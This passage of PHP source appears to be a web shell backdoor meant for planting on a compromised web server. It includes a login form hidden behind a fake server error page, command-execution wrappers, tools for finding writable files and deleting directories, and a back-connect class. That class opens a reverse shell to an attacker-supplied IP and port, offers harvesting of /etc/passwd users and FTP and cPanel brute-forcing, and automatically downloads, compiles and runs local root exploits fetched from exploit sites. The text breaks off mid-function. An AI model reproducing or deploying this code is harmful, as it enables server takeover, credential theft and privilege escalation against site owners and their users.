        if ($_SERVER["SERVER_SIGNATURE"] != ""){
        echo $_SERVER["SERVER_SIGNATURE"];
        }else{
        echo '<address>' . $_SERVER['SERVER_SOFTWARE'] . ' Server at ' . $_SERVER['HTTP_HOST'] . ' Port 80</address>';
        }
    } else {
        echo $epage;
    }
    echo '<style>
		input { margin:0;background-color:transparent;border:0px solid #fff; }
	</style>
	<center>
	<form method="post">
	<input type="password" name="password">
	<input type="hidden" name="action" value="login">
	</form></center>';
    exit;
}
function execute($cfe)
{
    $res = '';
    if ($cfe) {
        if (function_exists('system')) {
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif (function_exists('shell_exec')) {
            $res = @shell_exec($cfe);
        } elseif (function_exists('exec')) {
            @exec($cfe, $res);
            $res = join("\n", $res);
        } elseif (@is_resource($f = @popen($cfe, "r"))) {
            $res = '';
            while (!@feof($f)) {
                $res .= @fread($f, 1024);
            }
            @pclose($f);
        }
    }
    return $res;
}
function which($pr)
{
    $path = execute("which $pr");
    return ($path ? $path : $pr);
}
function cf($fname, $text)
{
    if ($fp = @fopen($fname, 'w')) {
        @fputs($fp, @base64_decode($text));
        @fclose($fp);
    }
}
function dirsize($dir)
{
    $dh   = @opendir($dir);
    $size = 0;
    while ($file = @readdir($dh)) {
        if ($file != '.' && $file != '..') {
            $path = $dir . '/' . $file;
            $size += @is_dir($path) ? dirsize($path) : @filesize($path);
        }
    }
    @closedir($dh);
    return $size;
}
function debuginfo()
{
    global $starttime;
    $mtime     = explode(' ', microtime());
    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
    echo 'Processed in ' . $totaltime . ' second(s)';
}
function mydbconn($dbhost, $dbuser, $dbpass, $dbname = '', $charset = '', $dbport = '3306')
{
    global $charsetdb;
    @ini_set('mysql.connect_timeout', 5);
    if (!$link = @mysql_connect($dbhost . ':' . $dbport, $dbuser, $dbpass)) {
        p('<h2>Can\'t connect to MySQL server.</h2>');
        exit;
    }
    if ($link && $dbname) {
        if (!@mysql_select_db($dbname, $link)) {
            p('<h2>Database selected has error</h2>');
            exit;
        }
    }
    if ($link && mysql_get_server_info() > '4.1') {
        if ($charset && in_array(strtolower($charset), $charsetdb)) {
            q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
        }
    }
    return $link;
}
function s_array(&$array)
{
    if (is_array($array)) {
        foreach ($array as $k => $v) {
            $array[$k] = s_array($v);
        }
    } else if (is_string($array)) {
        $array = stripslashes($array);
    }
    return $array;
}
function html_clean($content)
{
    $content = htmlspecialchars($content);
    $content = str_replace("\n", "<br />", $content);
    $content = str_replace("  ", "  ", $content);
    $content = str_replace("\t", "    ", $content);
    return $content;
}
function getChmod($filepath)
{
    return substr(base_convert(@fileperms($filepath), 10, 8), -4);
}
function getPerms($filepath)
{
    $mode = @fileperms($filepath);
    if (($mode & 0xC000) === 0xC000) {
        $type = 's';
    } elseif (($mode & 0x4000) === 0x4000) {
        $type = 'd';
    } elseif (($mode & 0xA000) === 0xA000) {
        $type = 'l';
    } elseif (($mode & 0x8000) === 0x8000) {
        $type = '-';
    } elseif (($mode & 0x6000) === 0x6000) {
        $type = 'b';
    } elseif (($mode & 0x2000) === 0x2000) {
        $type = 'c';
    } elseif (($mode & 0x1000) === 0x1000) {
        $type = 'p';
    } else {
        $type = '?';
    }
    $owner['read']    = ($mode & 00400) ? 'r' : '-';
    $owner['write']   = ($mode & 00200) ? 'w' : '-';
    $owner['execute'] = ($mode & 00100) ? 'x' : '-';
    $group['read']    = ($mode & 00040) ? 'r' : '-';
    $group['write']   = ($mode & 00020) ? 'w' : '-';
    $group['execute'] = ($mode & 00010) ? 'x' : '-';
    $world['read']    = ($mode & 00004) ? 'r' : '-';
    $world['write']   = ($mode & 00002) ? 'w' : '-';
    $world['execute'] = ($mode & 00001) ? 'x' : '-';
    if ($mode & 0x800) {
        $owner['execute'] = ($owner['execute'] == 'x') ? 's' : 'S';
    }
    if ($mode & 0x400) {
        $group['execute'] = ($group['execute'] == 'x') ? 's' : 'S';
    }
    if ($mode & 0x200) {
        $world['execute'] = ($world['execute'] == 'x') ? 't' : 'T';
    }
    return $type . $owner['read'] . $owner['write'] . $owner['execute'] . $group['read'] . $group['write'] . $group['execute'] . $world['read'] . $world['write'] . $world['execute'];
}
function getUser($filepath)
{
    if (function_exists('posix_getpwuid')) {
        $array = @posix_getpwuid(@fileowner($filepath));
        if ($array && is_array($array)) {
            return ' / <a href="#" title="User: ' . $array['name'] . '&#13&#10Passwd: ' . $array['passwd'] . '&#13&#10Uid: ' . $array['uid'] . '&#13&#10gid: ' . $array['gid'] . '&#13&#10Gecos: ' . $array['gecos'] . '&#13&#10Dir: ' . $array['dir'] . '&#13&#10Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
        }
    }
    return '';
}
function deltree($deldir)
{
    $mydir = @dir($deldir);
    while ($file = $mydir->read()) {
        if ((is_dir($deldir . '/' . $file)) && ($file != '.') && ($file != '..')) {
            @chmod($deldir . '/' . $file, 0777);
            deltree($deldir . '/' . $file);
        }
        if (is_file($deldir . '/' . $file)) {
            @chmod($deldir . '/' . $file, 0777);
            @unlink($deldir . '/' . $file);
        }
    }
    $mydir->close();
    @chmod($deldir, 0777);
    return @rmdir($deldir) ? 1 : 0;
}
function bg()
{
    global $bgc;
    return ($bgc++ % 2 == 0) ? 'alt1' : 'alt2';
}
function getPath($scriptpath, $nowpath)
{
    if ($nowpath == '.') {
        $nowpath = $scriptpath;
    }
    $nowpath = str_replace('\\', '/', $nowpath);
    $nowpath = str_replace('//', '/', $nowpath);
    if (substr($nowpath, -1) != '/') {
        $nowpath = $nowpath . '/';
    }
    return $nowpath;
}
function getUpPath($nowpath)
{
    $pathdb = explode('/', $nowpath);
    $num    = count($pathdb);
    if ($num > 2) {
        unset($pathdb[$num - 1], $pathdb[$num - 2]);
    }
    $uppath = implode('/', $pathdb) . '/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}
function getcfg($varname)
{
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'No';
    } elseif ($result == 1) {
        return 'Yes';
    } else {
        return $result;
    }
}
function getfun($funName)
{
    return (false !== function_exists($funName)) ? 'Yes' : 'No';
}
function getext($file)
{
    $info = pathinfo($file);
    return $info['extension'];
}
function GetWDirList($dir)
{
    global $dirdata, $j, $nowpath;
    !$j && $j = 1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $f = str_replace('//', '/', $dir . '/' . $file);
            if ($file != '.' && $file != '..' && is_dir($f)) {
                if (is_writable($f)) {
                    $dirdata[$j]['filename']    = str_replace($nowpath, '', $f);
                    $dirdata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                    $dirdata[$j]['dirchmod']    = getChmod($f);
                    $dirdata[$j]['dirperm']     = getPerms($f);
                    $dirdata[$j]['dirlink']     = $dir;
                    $dirdata[$j]['server_link'] = $f;
                    $j++;
                }
                GetWDirList($f);
            }
        }
        closedir($dh);
        clearstatcache();
        return $dirdata;
    } else {
        return array();
    }
}
function GetWFileList($dir)
{
    global $filedata, $j, $nowpath, $writabledb;
    !$j && $j = 1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $ext = getext($file);
            $f   = str_replace('//', '/', $dir . '/' . $file);
            if ($file != '.' && $file != '..' && is_dir($f)) {
                GetWFileList($f);
            } elseif ($file != '.' && $file != '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                if (is_writable($f)) {
                    $filedata[$j]['filename']    = str_replace($nowpath, '', $f);
                    $filedata[$j]['size']        = sizecount(@filesize($f));
                    $filedata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                    $filedata[$j]['filechmod']   = getChmod($f);
                    $filedata[$j]['fileperm']    = getPerms($f);
                    $filedata[$j]['fileowner']   = getUser($f);
                    $filedata[$j]['dirlink']     = $dir;
                    $filedata[$j]['server_link'] = $f;
                    $j++;
                }
            }
        }
        closedir($dh);
        clearstatcache();
        return $filedata;
    } else {
        return array();
    }
}
function GetSFileList($dir, $content, $re = 0)
{
    global $filedata, $j, $nowpath, $writabledb;
    !$j && $j = 1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $ext = getext($file);
            $f   = str_replace('//', '/', $dir . '/' . $file);
            if ($file != '.' && $file != '..' && is_dir($f)) {
                GetSFileList($f, $content, $re = 0);
            } elseif ($file != '.' && $file != '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                $find = 0;
                if ($re) {
                    if (preg_match('@' . $content . '@', $file) || preg_match('@' . $content . '@', @file_get_contents($f))) {
                        $find = 1;
                    }
                } else {
                    if (strstr($file, $content) || strstr(@file_get_contents($f), $content)) {
                        $find = 1;
                    }
                }
                if ($find) {
                    $filedata[$j]['filename']    = str_replace($nowpath, '', $f);
                    $filedata[$j]['size']        = sizecount(@filesize($f));
                    $filedata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                    $filedata[$j]['filechmod']   = getChmod($f);
                    $filedata[$j]['fileperm']    = getPerms($f);
                    $filedata[$j]['fileowner']   = getUser($f);
                    $filedata[$j]['dirlink']     = $dir;
                    $filedata[$j]['server_link'] = $f;
                    $j++;
                }
            }
        }
        closedir($dh);
        clearstatcache();
        return $filedata;
    } else {
        return array();
    }
}
function qy($sql)
{
    global $mysqllink;
    $res = $error = '';
    if (!$res = @mysql_query($sql, $mysqllink)) {
        return 0;
    } else if (is_resource($res)) {
        return 1;
    } else {
        return 2;
    }
    return 0;
}
function q($sql)
{
    global $mysqllink;
    return @mysql_query($sql, $mysqllink);
}
function fr($qy)
{
    mysql_free_result($qy);
}
//function sizecount2($fileSize) {
//$size = sprintf("%u",$fileSize);
//if($size == 0) {
//return '0 Bytes';
//}
//$sizename = array(' Bytes',' KB',' MB',' GB',' TB',' PB',' EB',' ZB',' YB');
//return round( $size / pow(1024,($i = floor(log($size,1024)))),2) .$sizename[$i];
//}
function sizecount($bytes)
{
    $labels = array(
        'Bytes',
        'KB',
        'MB',
        'GB',
        'TB',
        'PB',
        'EB',
        'YB'
    );
    for ($x = 0; $bytes >= 1024 && $x < (count($labels) - 1); $bytes /= 1024, $x++);
    return (round($bytes, 2) . ' ' . $labels[$x]);
}
function sqldumptable($table, $fp = 0)
{
    global $mysqllink;
    $tabledump = "DROP TABLE IF EXISTS `$table`;\n";
    $res       = q("SHOW CREATE TABLE $table");
    $create    = mysql_fetch_row($res);
    $tabledump .= $create[1] . ";\n\n";
    if ($fp) {
        fwrite($fp, $tabledump);
    } else {
        echo $tabledump;
    }
    $tabledump = '';
    $rows      = q("SELECT * FROM `$table`");
    while ($row = mysql_fetch_assoc($rows)) {
        foreach ($row as $k => $v) {
            $row[$k] = "'" . @mysql_real_escape_string($v) . "'";
        }
        $tabledump = 'INSERT INTO `' . $table . '` VALUES (' . implode(", ", $row) . ');' . "\n";
        if ($fp) {
            fwrite($fp, $tabledump);
        } else {
            echo $tabledump;
        }
    }
    fwrite($fp, "\n\n");
    fr($rows);
}
function p($str)
{
    echo $str . "\n";
}
function tbhead()
{
    p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot()
{
    p('</table>');
}
function makehide($name, $value = '')
{
    p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}
function makeinput($arg = array())
{
    $arg['size']  = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
    $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
    !$arg['type'] && $arg['type'] = 'text';
    $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
    $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
    $hf           = "";
    if ($arg['type'] == "text") {
        $hf = "onmouseover=\"this.focus();\" ";
    }
    if ($arg['newline']) {
        p("<p>$arg[title]<input " . $hf . "class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
    } else {
        p("$arg[title]<input " . $hf . "class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
    }
}
function makeselect($arg = array())
{
    if ($arg['onchange']) {
        $onchange = 'onchange="' . $arg['onchange'] . '"';
    }
    $arg['title'] = $arg['title'] ? $arg['title'] : '';
    if ($arg['newline'])
        p('<p>');
    p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
    if (is_array($arg['option'])) {
        if ($arg['nokey']) {
            foreach ($arg['option'] as $value) {
                if ($arg['selected'] == $value) {
                    p("<option value=\"$value\" selected>$value</option>");
                } else {
                    p("<option value=\"$value\">$value</option>");
                }
            }
        } else {
            foreach ($arg['option'] as $key => $value) {
                if ($arg['selected'] == $key) {
                    p("<option value=\"$key\" selected>$value</option>");
                } else {
                    p("<option value=\"$key\">$value</option>");
                }
            }
        }
    }
    p("</select>");
    if ($arg['newline'])
        p('</p>');
}
function formhead($arg = array())
{
    global $self;
    !$arg['method'] && $arg['method'] = 'post';
    !$arg['action'] && $arg['action'] = $self;
    $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
    !$arg['name'] && $arg['name'] = 'form1';
    p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
    if ($arg['title']) {
        p('<h2>' . $arg['title'] . '</h2>');
    }
}
function maketext($arg = array())
{
    !$arg['cols'] && $arg['cols'] = 100;
    !$arg['rows'] && $arg['rows'] = 25;
    $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
    if ($arg['dataeditor'] != "") {
        p("<p>$arg[title]<textarea onmouseover=\"this.focus();\" class=\"area\" id=\"$arg[name]\" data-editor=\"$arg[dataeditor]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>" . ($arg['value']) . "</textarea></p>");
        
    } else {
        p("<p>$arg[title]<textarea onmouseover=\"this.focus();\" class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>" . ($arg['value']) . "</textarea></p>");
    }
}
function formfooter($name = '')
{
    !$name && $name = 'submit';
    p('<p><input class="bt" name="' . $name . '" id="' . $name . '" type="submit" value="Submit"></p>');
    p('</form>');
}
function goback()
{
    global $self, $nowpath;
    p('<form action="' . $self . '" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="' . $nowpath . '" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
}
function formfoot()
{
    p('</form>');
}
function encode_pass($pass)
{
    //$p2ass = md5($pass);
    //$p2ass = md5($pass);
    //$p2ass = md5($pass);
    return md5(md5(md5($pass)));
}
function exec_all($command)
{
    $output = "";
    if (function_exists('exec')) {
        exec($command, $output);
        $output = join("\n", $output);
    }
    
    else if (function_exists('shell_exec')) {
        $output = shell_exec($command);
    }
    
    else if (function_exists('popen')) {
        $handle = popen($command, "r"); // Open the command pipe for reading
        if (is_resource($handle)) {
            if (function_exists('fread') && function_exists('feof')) {
                while (!feof($handle)) {
                    $output .= fread($handle, 512);
                }
            } else if (function_exists('fgets') && function_exists('feof')) {
                while (!feof($handle)) {
                    $output .= fgets($handle, 512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if (function_exists('system')) {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents(); // Get the ouput 
        ob_end_clean(); // Stop output buffering
    }
    
    else if (function_exists('passthru')) {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents(); // Get the ouput 
        ob_end_clean(); // Stop output buffering            
    }
    
    else if (function_exists('proc_open')) {
        $descriptorspec = array(
            1 => array(
                "pipe",
                "w"
            ) // stdout is a pipe that the child will write to
        );
        $handle         = proc_open($command, $descriptorspec, $pipes); // This will return the output to an array 'pipes'
        if (is_resource($handle)) {
            if (function_exists('fread') && function_exists('feof')) {
                while (!feof($pipes[1])) {
                    $output .= fread($pipes[1], 512);
                }
            } else if (function_exists('fgets') && function_exists('feof')) {
                while (!feof($pipes[1])) {
                    $output .= fgets($pipes[1], 512);
                }
            }
        }
        pclose($handle);
    }
    return (htmlspecialchars($output));
    
}
function recursive_str_ireplace($replacethis, $withthis, $inthis)
{
    while (1 == 1) {
        $inthis = str_ireplace($replacethis, $withthis, $inthis);
        if (stristr($inthis, $replacethis) === FALSE) {
            RETURN $inthis;
        }
    }
    RETURN $inthis;
}
function recursive_str_replace($replacethis, $withthis, $inthis)
{
    while (1 == 1) {
        $inthis = str_replace($replacethis, $withthis, $inthis);
        if (strstr($inthis, $replacethis) === FALSE) {
            RETURN $inthis;
        }
    }
    RETURN $inthis;
}
function mailAttachmentHeader($message)
{
    $mime_boundary = md5(time());
    $xMessage      = "Content-Type: multipart/mixed; boundary=\"" . $mime_boundary . "\"\r\n\r\n";
    $xMessage .= "--" . $mime_boundary . "\r\n";
    $xMessage .= "Content-Type: text/plain; charset=\"iso-8859-1\"\r\n";
    $xMessage .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $xMessage .= $message . "\r\n\r\n";
    for ($i = 0; $i < count($_FILES['file']['name']); $i++) {
        if ($_FILES['file']['name'][0] != "") {
            $xMessage .= "--" . $mime_boundary . "\r\n";
            $xMessage .= "Content-Type: " . $_FILES['file']['type'][$i] . "; name=\"" . $_FILES['file']['name'][$i] . "\"\r\n"; //"Content-Type: application/octet-stream; name=\"".$_FILES['file']['name']."\"\r\n";
            $xMessage .= "Content-Transfer-Encoding: base64\r\n";
            $xMessage .= "Content-Disposition: attachment; filename=\"" . $_FILES['file']['name'][$i] . "\"\r\n\r\n";
            $content = file_get_contents($_FILES['file']['tmp_name'][$i]);
            $xMessage .= chunk_split(base64_encode($content));
            $xMessage .= "\r\n\r\n";
        }
    }
    $xMessage .= "--" . $mime_boundary . "--\r\n\r\n";
    return $xMessage;
}
function generateRandomString($length = 10)
{
    $characters   = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function wsoEx($in)
{
    $out = '';
    if (function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\n", $out);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $out = "";
        while (!@feof($f))
            $out .= fread($f, 1024);
        pclose($f);
    }
    return $out;
}
function clang($ext)
{
    switch (strtolower($ext)) {
        case "php":
            return "php";
            break;
        case "htm":
            return "html";
            break;
        case "html":
            return "html";
            break;
        case "js":
            return "javascript";
            break;
        case "py":
            return "python";
            break;
        case "rb":
            return "ruby";
            break;
        default:
            return "text";
            break;
            
    }
}
function get_data($url)
{
    $ch      = curl_init();
    $timeout = 5;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
function geterrorpage()
{
    $u           = "/" . substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 26);
    $ux          = (!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $u : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $u;
    $data        = file_get_contents($ux, false, stream_context_create(array(
        'http' => array(
            'follow_location' => true,
            'ignore_errors' => true
        )
    )));
    $redirecturl = str_replace("Location: ", "", $http_response_header[3]);
    if (!$data) {
        $ch      = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $ux);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data        = curl_exec($ch);
        $redirecturl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);
    }
    $data      = str_replace($u, $_SERVER['REQUEST_URI'], $data);
    $linktypes = array(
        "href",
        "src",
        "action"
    );
    foreach ($linktypes as $linktype) {
        preg_match_all("/" . $linktype . "=([\"\'])(.*?)([\"\'])/i", $data, $matches);
        for ($i = 0; $i < count($matches[0]); ++$i) {
            $href = $matches[2][$i];
            if (0 === strpos($href, 'http') || 0 === strpos($href, 'data:') || 0 === strpos($href, '#') || 0 === strpos($href, 'javascript:') || 0 === strpos($href, '//')) {
                //Valid Links
            } else {
                $data = str_replace($matches[1][$i] . $matches[2][$i] . $matches[3][$i], $matches[1][$i] . dirname($redirecturl) . "/" . $matches[2][$i] . $matches[3][$i], $data);
            }
        }
    }
    //Now for CSS images
    preg_match_all("/url\(([\"\'])(.*?)([\"\'])\)/i", $data, $matches);
    for ($i = 0; $i < count($matches[0]); ++$i) {
        $href = $matches[2][$i];
        if (0 === strpos($href, 'http') || 0 === strpos($href, '//')) {
            //Valid Links
        } else {
            $data = str_replace($matches[1][$i] . $matches[2][$i] . $matches[3][$i], $matches[1][$i] . dirname($redirecturl) . "/" . $matches[2][$i] . $matches[3][$i], $data);
        }
    }
    return $data;
}
function strbool($value)
{
    return $value ? 'true' : 'false';
}
class BC
{
  private $your_ip;
  private $your_port;
  private $server_ip;
  private $timeout;
  private $homefolder;
  public function __construct($yip,$yp,$sip,$t)
  {
  $this->your_ip   = $yip;
  $this->your_port = $yp;
  $this->server_ip = $sip;
  $this->timeout   = $t;
  ob_flush(); flush();
  $this->createshell();
  }
  private function createshell()
  {
  $socket = @fsockopen($this->your_ip,$this->your_port,$errno,$errstr,$this->timeout) or die("<font color='red'>Unfortunately could not spawn shell</font>\n<br>");
  print("<font color='green'>Shell process opened to <strong>$this->server_ip</strong> > <strong>$this->your_ip:$this->your_port</strong></font>\n<br>");
  ob_flush(); flush();
  fwrite($socket,"=============================================================");
  fwrite($socket,"
 _  _    ___  _  _     ____  _          _ _ 
| || |  / _ \| || |   / ___|| |__   ___| | |
| || |_| | | | || |_  \___ \| '_ \ / _ \ | |
|__   _| |_| |__   _|  ___) | | | |  __/ | |
   |_|  \___/   |_|   |____/|_| |_|\___|_|_|
                                            \n");
  fwrite($socket,"=============================================================\n");
  fwrite($socket,"# Information:\n");
  fwrite($socket,"-------------------------------------------------------------\n");
  fwrite($socket,"uname -a: ".@shell_exec("uname -a")."\n");
  fwrite($socket,"whoami: ".@shell_exec("whoami")."\n");
  fwrite($socket,"id: ".@shell_exec("id")."\n");
  fwrite($socket,"pwd: ".@shell_exec("pwd")."\n");
  fwrite($socket,"# Options:\n");
  fwrite($socket,"- exploit = Automatic Search & Download & Run a local root exploit which matches with kernel release\n");
  fwrite($socket,"- grabusr = Grab users from /etc/passwd and save into a file ( users )\n");
  fwrite($socket,"- domains = List domains from /var/named\n");
  fwrite($socket,"- getf    = Find and grab the name given file from all public_html dirs ( only works with /home/USER/public_html servers )\n");
  fwrite($socket,"- catln   = Cat file with ln -s method\n");
  fwrite($socket,"- index    = Try copy the name given file to all public_html dirs ( only works with /home/USER/public_html servers )\n");
  fwrite($socket,"- home    = Change dir into home folder\n");
  fwrite($socket,"- ftp    = Performs ftp brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
  fwrite($socket,"- cpanel  = Performs cpanel brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
  $this->homefolder = trim(@shell_exec("pwd"));
  fwrite($socket,"-------------------------------------------------------------\n");
  $result= @shell_exec("whoami");
  fwrite($socket,$result);
  print "<font color='green'>Command whoami;</font>\n";
  print $result;
  ob_flush(); flush();
  preg_match("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@shell_exec("uname -r"),$version);
  $version1 = $version[0];
  $version2 = $version[1].".".$version[2].".".$version[3];
  print "<pre>";
  while(1)
  {
  $enter = fgets($socket);
  if(preg_match('#exit#',$enter)){fwrite($socket,"Process closed\n");exit("Process closed");fclose($socket);}
  if(preg_match('#exploit#',$enter)){$this->search($version1,$socket);$this->search($version2,$socket);}
  if(preg_match('#grabusr#',$enter)){$this->grab_users($socket);}
  if(preg_match('#catln (.+)#',$enter,$file)){$this->catln($file[1],$socket);}
  if(preg_match('#index (.+)#',$enter,$file)){$this->index($file[1],$socket);}
  if(preg_match('#getf (.+)#',$enter,$file)){$this->getf($file[1],$socket);}
  if(preg_match('#ftp (.+)#',$enter,$file)){$this->ftp($file[1],$socket);}
  if(preg_match('#cpanel (.+)#',$enter,$file)){$this->cpanel($file[1],$socket);}
  if(preg_match('#domains#',$enter)){$this->domains($socket);}
  if(eregi('home',$enter)){chdir($this->homefolder);}
  if(strpos($enter,'cd ..')){
  $curr = getcwd();
  $explode = explode("/",$curr);
  $c = count($explode);
  unset($explode[$c-1]);
  $explode = array_values(array_filter($explode));
  $path   = implode("/",$explode);
  $path   = "/".$path;
  if(!chdir($path)){fwrite($socket,"Can't chdir into $path : Permission denied\n");}
  }
  elseif(preg_match('#cd (.+)#',$enter,$dir)){
  $curr = getcwd();
  if(preg_match("#\/#si",$dir[1]))
  {
  if(!chdir($dir[1])){fwrite($socket,"Can't chdir into $dir[1] : Permission denied\n");}
  }
  else
  {
  if(!chdir($curr."/".$dir[1])){fwrite($socket,"Can't chdir into $curr/$dir[1] : Permission denied\n");}
  }
  
  }
  $result= @shell_exec(trim($enter));
  fwrite($socket,$result);
  print "<font color='green'>Command ".trim($enter).";</font>\n";
  print $result;
  ob_flush(); flush();
  }
  print "</pre>";
  fclose($socket);
  }
  private function search($version,$socket)
  {
    fwrite($socket,"Release: $version\n");
    print("Release: $version\n<br>");
    ob_flush();flush();
    fwrite($socket,"Searching Exploit-DB for local root exploits..\n");
    print("Searching Exploit-DB for local root exploits..\n<br>");
    $exploit_db = $this->curl("http://www.exploit-db.com/search/?action=search&filter_description=$version");
    if(preg_match('/No results/si',$exploit_db))
    {
    fwrite($socket,"Not found any exploits\n");
    print("Not found any exploits\n<br>");
    ob_flush();flush();
    }
    else
    {
    fwrite($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    preg_match_all('#<td class="list_explot_description">(.*?)<\/td>#si',$exploit_db,$list);
    foreach($list[1] as $listx)
    {
    preg_match('#<a  href="(.*?)">(.*?)<\/a>#si',$listx,$exploit);
    fwrite($socket,"[+] ".$exploit[2]."\n");
    print("[+] ".$exploit[2]."\n<br>");
    fwrite($socket,"Trying pwn this server with this exploit\n");
    print("Trying pwn this server with this exploit\n<br>");
    fwrite($socket,"Downloading => ".$exploit[1]."\n");
    print("Downloading => ".$exploit[1]."\n<br>");
    ob_flush();flush();
    $download = $this->download($exploit[1]);
    if($download != false)
    {
    fwrite($socket,"File downloaded saved as $download\n");
    print("File downloaded saved as $download\n<br>");
    fwrite($socket,"Trying compile to $download file\n");
    print("Trying compile to $download file\n<br>");
    ob_flush();flush();
    $withoutc = str_replace(".c","",$download);
    @shell_exec("gcc $download -o $withoutc");
    if(file_exists($withoutc))
    {
    fwrite($socket,"File compiled\n");
    print("File compiled\n<br>");
    fwrite($socket,"Setting chmod options\n");
    print("Setting chmod options\n<br>");
    @shell_exec("chmod +x $withoutc");
    fwrite($socket,"Running exploit..!\n");
    print("Running exploit..!\n<br>");
    ob_flush();flush();
    @shell_exec("./$withoutc");
    }
    else
    {
    fwrite($socket,"File doesn't compile\n");
    print("File doesn't compile\n<br>");
    ob_flush();flush();
    }
    
    }
    else
    {
    fwrite($socket,"File doesn't download\n");
    print("File doesn't download\n<br>");
    ob_flush();flush();
    }
    
    }
    fwrite($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    }
    fwrite($socket,"Searching 1337day for local root exploits..\n");
    print("Searching 1337day for local root exploits..\n<br>");
    ob_flush();flush();
    $day1337 = $this->curl("http://www.1337day.com/search","agree=Ok&dong=$version&submit_search=Submit");
    preg_match_all("#<a href='/exploit/description/(.*?)'  >(.*?)<\/a>#si",$day1337,$exploits);
    if($exploits[1])
    {
    fwrite($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    foreach($exploits[1] as $i => $exploit)
    {
    fwrite($socket,"[+] ".$exploits[2][$i]."\n");
    print("[+] ".$exploits[2][$i]."\n<br>");
    fwrite($socket,"Trying pwn this server with this exploit\n");
    print("Trying pwn this server with this exploit\n<br>");
    $exploit_link = "http://www.1337day.com/exploit/$exploit";
    fwrite($socket,"Downloading => ".$exploit_link."\n");
    print("Downloading => ".$exploit_link."\n<br>");
    ob_flush();flush();
    $download = $this->day1337download($exploit_link);
    if($download != false)
    {
    fwrite($socket,"File downloaded saved as $download\n");
    print("File downloaded saved as $download\n<br>");
    fwrite($socket,"Trying compile to $download file\n");
    print("Trying compile to $download file\n<br>");
    ob_flush();flush();
    $withoutc = str_replace(".c","",$download);
    @shell_exec("gcc $download -o $withoutc");
    if(file_exists($withoutc))
    {
    fwrite($socket,"File compiled\n");
    print("File compiled\n<br>");
    fwrite($socket,"Setting chmod options\n");
    print("Setting chmod options\n<br>");
    @shell_exec("chmod +x $withoutc");
    fwrite($socket,"Running exploit..!\n");
